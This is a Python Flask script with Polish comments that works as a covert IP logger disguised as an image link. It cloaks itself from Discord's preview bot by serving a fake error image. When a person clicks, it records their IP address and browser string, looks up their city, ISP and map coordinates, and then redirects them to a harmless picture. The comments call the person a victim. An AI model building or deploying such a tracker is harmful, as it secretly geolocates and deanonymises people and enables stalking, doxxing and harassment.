from flask import Flask, request, redirect, make_response
import requests

app = Flask(__name__)

# --- KONFIGURACJA ---
# Link do Twojego obrazka błędu
ERROR_IMG = "https://preview.redd.it/failed-to-load-image-on-mobile-v0-v9v846fbt01a1.png?width=1080&format=png&auto=webp&s=5568f1857948270139b8f2f458e0a3f6a27e029c"
# Link do zdjęcia docelowego dla ofiary
REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"

@app.route('/image.png') # Dokładnie tak jak chciałeś
def logger():
    ua = request.headers.get('User-Agent', '')
    # Wyciąganie IP przez proxy Rendera
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # 1. Jeśli to bot Discorda - robimy "twarde" przekierowanie do obrazka
    if "Discordbot" in ua or "externalhit" in ua.lower():
        print(f"--- BOT DISCORDA POBIERA PODGLĄD ---")
        response = make_response(redirect(ERROR_IMG))
        # Udajemy, że to co wysyłamy to obrazek png
        response.headers['Content-Type'] = 'image/png'
        return response

    # 2. LOGOWANIE DANYCH (Człowiek)
    print(f"\n[!!!] OFIARA KLIKNĘŁA [!!!]")
    print(f"IP: {ip}")
    
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon", timeout=5).json()
        if r.get("status") == "success":
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('regionName')}, {r.get('country')}")
            print(f"MAPA: http://www.google.com/maps/place/{r.get('lat')},{r.get('lon')}")
    except:
        pass

    print(f"DEVICE: {ua}\n")

    # 3. Przekierowanie człowieka do celu
    return redirect(REAL_IMG)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
